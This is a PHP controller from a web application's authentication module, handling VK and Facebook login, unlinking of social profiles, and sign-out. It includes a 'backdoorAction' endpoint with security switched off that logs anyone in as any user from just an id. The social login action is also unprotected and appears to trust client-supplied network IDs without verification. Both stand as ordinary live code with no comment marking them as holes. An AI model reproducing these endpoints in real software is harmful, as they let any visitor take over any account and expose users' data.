<?php
class Controller_Auth_Do extends fvController {

    /**
     * @route /auth/do/{$social:vk|fb}/disconnect
     */
    function disconnectAction( $social ){
        try{
            $user = fvSite::session()->getUser();

            $subclass = ( $social == "vk" ) ? "User_Vk" : "User_FB";

            $social = $user->socials->select()->andWhere( array(
                "subclass" => $subclass
            ) )->fetchOne();

            if( ! $social instanceof User_Social ){
                throw new Exception("Not connected");
            }

            if( $social->initiator->get() ){
                throw new Exception("Profile is initiator");
            }

            $social->delete();

            return json_encode( array(
                "success" => true,
                "user"    => $user->toJSON()
            ) );
        } catch( Exception $e ){
            return json_encode( array(
                "success" => false,
                "error"   => $e->getMessage()
            ) );
        }
    }

    /**
     * @route /auth/do/{$social:vk|fb}
     *
     * @routeParam security off
     */
    function socialAuthAction( $social ){
        try{
            $authData = $this->getRequest()->auth;
            $connect = $this->getRequest()->connect;

            if( $social == "vk" ){
                $netId = $authData["mid"];
                $user = User_Vk::auth( $netId, $connect );
            } else {
                $netId = $authData["userID"];
                $user = User_FB::auth( $netId, $connect );
            }

            return json_encode( array( "success" => true,
                                       "user"    => $user->toJSON() ) );
        } catch( AlreadyConnectedException $e ){
            return json_encode( array( "success" => false,
                                       "error"   => "Этот профиль привязан к другому аккаунту" ) );
        } catch( Exception $e ){
            return json_encode( array( "success" => false,
                                       "error"   => $e->getMessage() ) );
        }
    }

    /**
     *  @routeParam security off
     */
    function backdoorAction( $id ){
        /** @var User $user */
        $user = User::find($id);
        if( !$user instanceof User ){
           throw new LogicException("not found");
        }
        $user->signIn();

        return $user->getId();
    }

    /**
     * @routeParam security off
     */
    function signOutAction(){
        $user = fvSite::session()->getUser();
        fvSite::session()->userId = null;
        $this->getResponse()->redirect("/");
        return "signed out!";
    }
}